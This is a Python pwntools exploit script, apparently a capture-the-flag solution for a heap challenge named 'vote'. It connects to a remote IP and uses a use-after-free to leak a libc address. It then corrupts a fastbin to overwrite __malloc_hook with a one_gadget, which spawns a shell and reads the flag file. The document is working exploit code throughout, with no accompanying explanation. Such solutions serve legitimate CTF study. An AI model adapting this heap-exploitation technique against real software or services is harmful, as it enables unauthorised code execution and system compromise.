from pwn import *
import time

context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']

bin = ELF('./vote')
libc = ELF('./libc-2.23.so')
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc-2.23.so")}

#conn = process('./vote', env=env)
#gdb.attach(conn)

conn = remote("47.97.190.1", 6000)

def menu(choice):
    conn.recvuntil("Action: ")
    conn.sendline(str(choice))

def create(size, name, shell=False):
    menu(0)
    conn.recvuntil("size: ");
    conn.sendline(str(size));
    if shell:
        return
    conn.recvuntil("name: ")
    conn.send(name)

def show(index):
    menu(1)
    conn.recvuntil("index: ")
    conn.sendline(str(index))

def vote(index):
    menu(2)
    conn.recvuntil("index: ");
    conn.sendline(str(index))

def result():
    menu(3)

def cancel(index):
    menu(4)
    conn.recvuntil("index: ")
    conn.sendline(str(index))

def exit():
    menu(5)

msize = 0x7f

create(msize, "a\n") # 0
create(msize, "b\n") # 1

cancel(0)

show(0)
conn.recvuntil("count: ")
libc_leak = int(conn.recvline().strip())
#libc.address = libc_leak - 0x7f98fa34db78 + 0x7f98f9f89000
libc.address = libc_leak - 0x7f4a8c9dab78 + 0x7f4a8c616000

log.info("Libc leak: " + hex(libc_leak))

# Fastbin corruption
payload = p64(0) + \
          p64(0x70) + \
          p64(libc.symbols['__malloc_hook'] - 0x23) + \
          "\n"
create(0x60 - 0x10, payload) # 2
create(0x60 - 0x10, "b\n") # 3

cancel(2)
cancel(3)
log.info(hex(libc.symbols['__malloc_hook'] - 0x23))

for i in range(0x10 + 0x10):
    vote(3)

create(0x60 - 0x10, "a\n") # 4
create(0x60 - 0x10, "b\n") # 5

one_gadget = libc.address + 0xf0274
payload = "\x00"*(0x23 - 0x10 - 0x10) + p64(one_gadget) + "\n"

create(0x60 - 0x10, payload)

create(0x10, "a\n", shell=True) # 6

conn.sendline("ls; cat flag")

conn.interactive()
